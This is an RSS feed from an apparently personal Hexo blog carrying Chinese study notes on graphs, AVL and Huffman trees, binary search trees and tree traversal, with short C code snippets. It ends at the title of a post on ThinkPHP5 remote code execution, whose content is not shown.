<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>阿卡丽的黑心商店</title>
    <link>http://example.com/</link>
    
    <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>上古时代的宝贝开卖了！</description>
    <pubDate>Mon, 15 Aug 2022 13:49:35 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>图的表示方法</title>
      <link>http://example.com/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/</link>
      <guid>http://example.com/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/</guid>
      <pubDate>Tue, 23 Aug 2022 13:46:57 GMT</pubDate>
      
      <description>&lt;p&gt;邻接矩阵法、十字链表法、邻接表法、邻接多重表的定义以及代码实现的学习以及其之间的比较&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>邻接矩阵法、十字链表法、邻接表法、邻接多重表的定义以及代码实现的学习以及其之间的比较</p><span id="more"></span><h2 id="邻接矩阵法"><a href="#邻接矩阵法" class="headerlink" title="邻接矩阵法"></a>邻接矩阵法</h2><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806130207218.png" alt="image-20220806130207218"><br>有向图：出度为行中1的个数  入度为列中1的个数 。矩阵是行-&gt;列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxVertexNum 100                      <span class="comment">//顶点数目最大值</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span> </span><br><span class="line">    <span class="type">char</span> Vex[MaxVertexNum];                   <span class="comment">//顶点表</span></span><br><span class="line">    <span class="type">int</span> Edge[MaxVertexNum][MaxVertexNum];     <span class="comment">//邻接矩阵、边表  //因为数据为0，1，可以换为bool型</span></span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;                        <span class="comment">//图当前的顶点数和边数/弧数</span></span><br><span class="line">&#125; MGraph</span><br></pre></td></tr></table></figure><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806130727614.png" alt="image-20220806130727614"></p><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806131031260.png" alt="image-20220806131031260"><br>使用宏定义常量表示无穷   #define INFINITY</p><h3 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h3><p>$$<br>在n个顶点的图中，空间复杂度为O(n)+O(n^2)&#x3D;O(|v|^2),|v|为顶点集的个数\<br>所以空间复杂度与边数没有关系，更适合用于存储稠密图，因为无向图的邻接矩阵是对称矩阵，所以可以压缩为上三角矩阵进行存储<br>$$</p><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806131810061.png" alt="image-20220806131810061"></p><h2 id="邻接表法"><a href="#邻接表法" class="headerlink" title="邻接表法"></a>邻接表法</h2><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806134053572.png" alt="image-20220806134053572"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//邻接表存储的图（顺序存储） </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    AdjList vertices;</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">&#125; ALGraph;</span><br><span class="line"><span class="comment">//顶点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VNode</span>&#123;</span></span><br><span class="line">VertexType data;               <span class="comment">//顶点信息</span></span><br><span class="line">    ArcNode *first;                <span class="comment">//第一条边</span></span><br><span class="line">&#125;VNode,AdjList[MaxVertexNum];</span><br><span class="line"><span class="comment">//边</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span>&#123;</span></span><br><span class="line"><span class="type">int</span> adjvex;                    <span class="comment">//边指向的结点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> *<span class="title">next</span>;</span>           <span class="comment">//指向下一条边的指针</span></span><br><span class="line">    <span class="comment">//InfoType info;                //边权值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无向图边结点数量是2|E|，整体空间复杂度为O(|V|+2|E|)<br>有向图边结点数量是|E|，整体空间复杂度为O(|V|+|E|)<br>邻接表存储稀疏图<br>出度：遍历目标结点的链表<br>入度：遍历整个链表寻找指向目标结点的个数</p><h2 id="十字链表、邻接多重表"><a href="#十字链表、邻接多重表" class="headerlink" title="十字链表、邻接多重表"></a>十字链表、邻接多重表</h2><p>十字链表用于存储有向图<br>邻接多重表存储无向图</p><h3 id="十字链表"><a href="#十字链表" class="headerlink" title="十字链表"></a>十字链表<img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806140152515.png" alt="image-20220806140152515"></h3><h3 id="邻接多重表"><a href="#邻接多重表" class="headerlink" title="邻接多重表"></a>邻接多重表</h3><p>邻接表存储无向图：每条边对于两份冗余数据，删除，删除顶点、边不方便<br><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806140736457.png" alt="image-20220806140736457"><br><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806140750826.png" alt="image-20220806140750826"><br>空间复杂度：O(|V|+|E|)</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/image-20220806141213425.png" alt="image-20220806141213425"></p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</category>
      
      <category domain="http://example.com/tags/%E5%9B%BE/">图</category>
      
      
      <comments>http://example.com/2022/08/23/%E5%9B%BE%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>图的基本操作</title>
      <link>http://example.com/2022/08/22/%E5%9B%BE%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</link>
      <guid>http://example.com/2022/08/22/%E5%9B%BE%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</guid>
      <pubDate>Mon, 22 Aug 2022 13:49:56 GMT</pubDate>
      
      <description>&lt;p&gt;图的几个基本操作函数总结&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>图的几个基本操作函数总结</p><span id="more"></span><h2 id="图的基本操作"><a href="#图的基本操作" class="headerlink" title="图的基本操作"></a>图的基本操作</h2><h3 id="Adjacent-G-x-y"><a href="#Adjacent-G-x-y" class="headerlink" title="Adjacent(G,x,y)"></a>Adjacent(G,x,y)</h3><p>判断图G是否存在边&lt;x,y&gt;(x,y)<br>该操作邻接矩阵更合适</p><h3 id="Neighbors-G-x"><a href="#Neighbors-G-x" class="headerlink" title="Neighbors(G,x)"></a>Neighbors(G,x)</h3><p>列出图G与结点x邻接的边<br>该操作一般情况下邻接矩阵更合适</p><h3 id="InsertVertex-G-x"><a href="#InsertVertex-G-x" class="headerlink" title="InsertVertex(G,x)"></a>InsertVertex(G,x)</h3><p>在图G中插入顶点x<br>在邻接矩阵和邻接表中都是在最后插入新的数据</p><h3 id="DeleteVertex-G-x"><a href="#DeleteVertex-G-x" class="headerlink" title="DeleteVertex(G,x)"></a>DeleteVertex(G,x)</h3><p>从图G中删除顶点x<br>邻接矩阵：删除一个顶点之后，将对应的行和列重置为0，可以设置一个bool变量表示是一个空结点</p><h3 id="AddEdge-G-x-y"><a href="#AddEdge-G-x-y" class="headerlink" title="AddEdge(G,x,y)"></a>AddEdge(G,x,y)</h3><p>若无向边（x,y)或者有向边&lt;x,y&gt;不存在，则向图G中添加该边<br>邻接表可以使用头插法，时间复杂度为O(1)</p><h3 id="FirstNeighbor-G-x"><a href="#FirstNeighbor-G-x" class="headerlink" title="FirstNeighbor(G,x)"></a>FirstNeighbor(G,x)</h3><p>求图G中顶点x的第一个邻接点，若有则返回顶点号，没有返回-1</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</category>
      
      <category domain="http://example.com/tags/%E5%9B%BE/">图</category>
      
      
      <comments>http://example.com/2022/08/22/%E5%9B%BE%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>图</title>
      <link>http://example.com/2022/08/22/%E5%9B%BE/</link>
      <guid>http://example.com/2022/08/22/%E5%9B%BE/</guid>
      <pubDate>Mon, 22 Aug 2022 13:43:24 GMT</pubDate>
      
      <description>&lt;p&gt;有向图无向图简单图多重图连通图强连通图子图的定义，以及图中顶点的度连通分量，边的权和图与树森林的关系和转化，特殊形态的图的学习&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>有向图无向图简单图多重图连通图强连通图子图的定义，以及图中顶点的度连通分量，边的权和图与树森林的关系和转化，特殊形态的图的学习</p><span id="more"></span><h2 id="图的基本概念"><a href="#图的基本概念" class="headerlink" title="图的基本概念"></a>图的基本概念</h2><h3 id="图的定义"><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803205115991.png"><br>图的边集可以为空集，边集可以有方向也可以没方向</p><p><strong>图逻辑结构的应用</strong><br>微信好友关系     地铁站（顶点集）铁路</p><h3 id="无向图，有向图"><a href="#无向图，有向图" class="headerlink" title="无向图，有向图"></a>无向图，有向图</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803205427477.png"><br>无向图边集用（)  有向图边集用&lt;&gt;</p><h3 id="简单图、多重图"><a href="#简单图、多重图" class="headerlink" title="简单图、多重图"></a>简单图、多重图</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803205904593.png"></p><h3 id="顶点的度、入度、出度"><a href="#顶点的度、入度、出度" class="headerlink" title="顶点的度、入度、出度"></a>顶点的度、入度、出度</h3><p>无向图：<strong>顶点v的度</strong>是该顶点边的条数，记为TD(v)<br>有向图：<strong>顶点v的入度</strong>是以顶点v为终点的有向边的数目，记为ID(v)<br>              <strong>顶点v的出度</strong>是以顶点v为起点的有向边的数目，记为OD(v)<br>              <strong>顶点v的度</strong>等于入度和出度的和，即TD(v)&#x3D;ID(v)+OD(v)<br>$$<br>n个顶点，e条边\无向图：\sum_{i&#x3D;1}^{n}TD(v_i)&#x3D;2e\有向图：\sum_{i&#x3D;1}^nID(v_i)&#x3D;\sum_{i&#x3D;1}^nOD(v_i)&#x3D;e<br>$$</p><h3 id="顶点-顶点的关系描述"><a href="#顶点-顶点的关系描述" class="headerlink" title="顶点-顶点的关系描述"></a>顶点-顶点的关系描述</h3><p>路径——顶点A到顶点E之间的一条路径是指顶点序列（A,B,C,D,E)<br>回路—— 第一个顶点和最后一个顶点相同的路径称为<strong>回路或者环</strong><br>简单路径——路径序列中顶点不重复出现的路径<br>简单回路——除第一个顶点和最后一个顶点外，其余顶点不重复出现<br>路径长度——路径上边的数目<br>点到点的距离——最短路径的长度（若不存在路径记为无穷）<br>无向图中，若从顶点v到顶点w有路径存在，则成v和w是连通的<br>有向图中，若从顶点v到顶点w和从顶点w到顶点v之间都有路径，则称这两个顶点是强连通的</p><h3 id="连通图、强连通图"><a href="#连通图、强连通图" class="headerlink" title="连通图、强连通图"></a>连通图、强连通图</h3><p>无向图：若图G任意两个顶点都是连通的，则称图G为连通图，否则为非连通图<br>有向图：若图G任何一对顶点都是强连通的，则称此图为强连通图</p><p>$$<br>常见考点：对于n个顶点的无向图G，若G是连通图，则最少有n-1条边。\若G是非连通图，则最多可能有C_{n-1}^2条边\对于有n个顶点的有向图G，若G是强连通图，则最少有n条边（形成回路）<br>$$</p><h3 id="子图"><a href="#子图" class="headerlink" title="子图"></a>子图</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803223621217.png"></p><h3 id="连通分量"><a href="#连通分量" class="headerlink" title="连通分量"></a>连通分量</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803223755599.png"><br><img src="/2022/08/22/%E5%9B%BE/image-20220803223815794.png"><br><img src="/2022/08/22/%E5%9B%BE/image-20220803223952245.png"></p><h3 id="生成树、森林"><a href="#生成树、森林" class="headerlink" title="生成树、森林"></a>生成树、森林</h3><p>连通图的生成树是包含图中全部顶点的一个极小连通子图<br><img src="/2022/08/22/%E5%9B%BE/image-20220803224238846.png"><br>n个顶点应该有n-1条边<br>在非连通图中，连通分量的生成树构成了非连通图的生成森林<br><img src="/2022/08/22/%E5%9B%BE/image-20220803224538347.png"></p><h3 id="边的权、带权图-x2F-网"><a href="#边的权、带权图-x2F-网" class="headerlink" title="边的权、带权图&#x2F;网"></a>边的权、带权图&#x2F;网</h3><p>边的权：每条边都可以标上具用某种含义的数值，该数值称为该边的<strong>权值</strong>。<br>带权图&#x2F;网：边上带有权值的图称为<strong>带权图</strong>，也称<strong>网</strong><br>带权路径长度：当图是带权图时，一条<strong>路径上所有边的权值之和</strong></p><h3 id="特殊形态的图"><a href="#特殊形态的图" class="headerlink" title="特殊形态的图"></a>特殊形态的图</h3><p><img src="/2022/08/22/%E5%9B%BE/image-20220803225437195.png"><br><img src="/2022/08/22/%E5%9B%BE/image-20220803225522718.png"><br><img src="/2022/08/22/%E5%9B%BE/image-20220803225858050.png"><br>树是连通图，有向树并不是强连通图</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</category>
      
      <category domain="http://example.com/tags/%E5%9B%BE/">图</category>
      
      
      <comments>http://example.com/2022/08/22/%E5%9B%BE/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>平衡二叉树以及哈夫曼树和哈夫曼编码</title>
      <link>http://example.com/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/</link>
      <guid>http://example.com/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/</guid>
      <pubDate>Sun, 21 Aug 2022 13:39:47 GMT</pubDate>
      
      <description>&lt;p&gt;平衡二叉树转换的四种情况解析以及代码实现。哈夫曼树以及哈夫曼编码的原理&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>平衡二叉树转换的四种情况解析以及代码实现。哈夫曼树以及哈夫曼编码的原理</p><span id="more"></span><h2 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h2><p>简称平衡树（AVL树）——树上任一结点的左子树和右子树的高度之差不超过1<br><strong>结点的平衡因子</strong>&#x3D;左子树高-右子树高<br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709234821736.png"></p><h3 id="平衡二叉树的插入"><a href="#平衡二叉树的插入" class="headerlink" title="平衡二叉树的插入"></a>平衡二叉树的插入</h3><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709234957697.png"></p><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709235020317.png"><br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709235353920.png" alt="image-20220709235353920"><br>假设的子树的高度一定都是统一的一个值H</p><h4 id="LL"><a href="#LL" class="headerlink" title="LL"></a>LL</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709235550956.png"></p><h4 id="RR"><a href="#RR" class="headerlink" title="RR"></a>RR</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220709235832689.png"></p><h4 id="代码思路"><a href="#代码思路" class="headerlink" title="代码思路"></a>代码思路</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000110322.png"></p><h4 id="LR"><a href="#LR" class="headerlink" title="LR"></a>LR</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000356369.png"><br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000444260.png"><br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000533083.png"></p><h4 id="RL"><a href="#RL" class="headerlink" title="RL"></a>RL</h4><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710000716645.png"></p><p><strong>插入操作导致最小不平衡子树高度+1，经过调整后高度恢复</strong></p><h3 id="查找效率问题"><a href="#查找效率问题" class="headerlink" title="查找效率问题"></a>查找效率问题</h3><h3 id="最坏时间复杂度O-h"><a href="#最坏时间复杂度O-h" class="headerlink" title="最坏时间复杂度O(h)"></a>最坏时间复杂度O(h)</h3><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710001904807.png"><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710001932928.png" alt="image-20220710001932928"><br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710001948415.png" alt="image-20220710001948415"></p><p><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710002053754.png"></p><h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><p>结点的权：有某种现实含义（如：表示节点的重要性）<br>结点的带权路径长度：从树的跟到该结点的路径长度（经过的边数）与该结点上权值的乘积<br>树的带权路径长度（WPL)：书中所有的叶子结点的带权路径长度之和<br><img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710002632003.png"><br>哈夫曼树的结点总数为2n-1<br>哈夫曼树中不存在度为1的结点<br>哈夫曼树并不唯一，但WPL必然相同且为最优</p><h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><p>固定长度编码——每个字都用相等长度的二进制位表示（ASCII编码）</p><p>可变长度编码<img src="/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220710003458543.png"><br>前缀编码：没有一个编码是另一个编码的前缀</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</category>
      
      <category domain="http://example.com/tags/%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/">树与二叉树</category>
      
      <category domain="http://example.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</category>
      
      
      <comments>http://example.com/2022/08/21/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>二叉排序树</title>
      <link>http://example.com/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/</link>
      <guid>http://example.com/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/</guid>
      <pubDate>Sun, 21 Aug 2022 13:36:59 GMT</pubDate>
      
      <description>&lt;p&gt;二叉排序树的原理以及基本操作&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>二叉排序树的原理以及基本操作</p><span id="more"></span><h2 id="二叉排序树（BST）"><a href="#二叉排序树（BST）" class="headerlink" title="二叉排序树（BST）"></a>二叉排序树（BST）</h2><p>二叉查找树<br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709231736496.png"><br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709231745186.png"><br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709231900686.png"></p><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">BSTNode *<span class="title function_">BST_Search</span><span class="params">(BSTree T,<span class="type">int</span> key)</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(T!=null&amp;&amp;key!=T-&gt;key)&#123;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;T-&gt;key)</span><br><span class="line">            T=T-&gt;lchild;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T=T-&gt;rchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;<span class="comment">//时间复杂度O(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//递归实现</span></span><br><span class="line">BSTNode *<span class="title function_">BST_Search</span><span class="params">(BSTree T,<span class="type">int</span> key)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==null)</span><br><span class="line">        <span class="keyword">return</span> null;</span><br><span class="line">    <span class="keyword">if</span>(key==T-&gt;key)</span><br><span class="line">        <span class="keyword">return</span> T;    <span class="comment">//查找成功</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T-&gt;key)</span><br><span class="line">        <span class="keyword">return</span> BSTSearch(T-&gt;lchild,key);   <span class="comment">//在左子树中查找</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> BSTSearch(T-&gt;rchild,key);   <span class="comment">//在右子树中查找</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间复杂度O(h)</span></span><br></pre></td></tr></table></figure><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709232619239.png"><br>注意插入操作是引用类型<br>最坏空间复杂度O(h)</p><h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709232821433.png"></p><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709233303115.png"></p><h2 id="查找效率分析"><a href="#查找效率分析" class="headerlink" title="查找效率分析"></a>查找效率分析</h2><p>查找成功的平均长度ASL<br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709233912561.png"><br>$$<br>尽可能达到O(log_2n)<br>$$<br>查找失败的平均查找长度<br><img src="/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/image-20220709234322040.png"></p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</category>
      
      <category domain="http://example.com/tags/%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/">树与二叉树</category>
      
      
      <comments>http://example.com/2022/08/21/%E4%BA%8C%E5%8F%89%E6%8E%92%E5%BA%8F%E6%A0%91/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>树和森林的遍历</title>
      <link>http://example.com/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/</link>
      <guid>http://example.com/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/</guid>
      <pubDate>Fri, 19 Aug 2022 09:04:20 GMT</pubDate>
      
      <description>&lt;p&gt;树的先根后根层次遍历和森林的先序后序遍历的代码实现&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>树的先根后根层次遍历和森林的先序后序遍历的代码实现</p><span id="more"></span><h2 id="树和森林的遍历"><a href="#树和森林的遍历" class="headerlink" title="树和森林的遍历"></a>树和森林的遍历</h2><h3 id="树的先根遍历"><a href="#树的先根遍历" class="headerlink" title="树的先根遍历"></a>树的先根遍历</h3><p>若树非空，先访问根节点，再依次对每棵子树进行先根遍历</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(TreeNode *R)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(R!=null)&#123;</span><br><span class="line">        visit(R);</span><br><span class="line">        <span class="keyword">while</span>(R还有下一个子树T)</span><br><span class="line">            PreOrder(T);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>树的先根遍历与二叉树的先序遍历相同<br>深度优先遍历</p><h3 id="树的后根遍历"><a href="#树的后根遍历" class="headerlink" title="树的后根遍历"></a>树的后根遍历</h3><p><img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709230748352.png"></p><p>树的后根遍历与二叉树的中序遍历相同<br>深度优先遍历</p><h3 id="树的层次遍历"><a href="#树的层次遍历" class="headerlink" title="树的层次遍历"></a>树的层次遍历</h3><p><img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709231031413.png"><br>树的层次遍历与二叉树的层序遍历相同<br>广度优先遍历</p><h3 id="森林的先序遍历"><a href="#森林的先序遍历" class="headerlink" title="森林的先序遍历"></a>森林的先序遍历</h3><p> <img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709231345040.png"><br>可以先转换成二叉树，在对二叉树进行先序遍历</p><h3 id="森林的中序遍历"><a href="#森林的中序遍历" class="headerlink" title="森林的中序遍历"></a>森林的中序遍历</h3><p><img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709231520092.png"></p><p>可以先转换成二叉树，在对二叉树进行中序遍历<br><img src="/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/image-20220709231626512.png"></p><h2 id><a href="#" class="headerlink" title></a></h2>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</category>
      
      <category domain="http://example.com/tags/%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/">树与二叉树</category>
      
      
      <comments>http://example.com/2022/08/19/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>RCE————thinkphp5</title>
      <link>http://example.com/2022/08/18/thinkphp5/</link>
      <guid>http://example.com/2022/08/18/thinkphp5/</guid>
      <pubDate>Thu, 18 Aug 2022 09:32:30 GMT</pubDate>
      
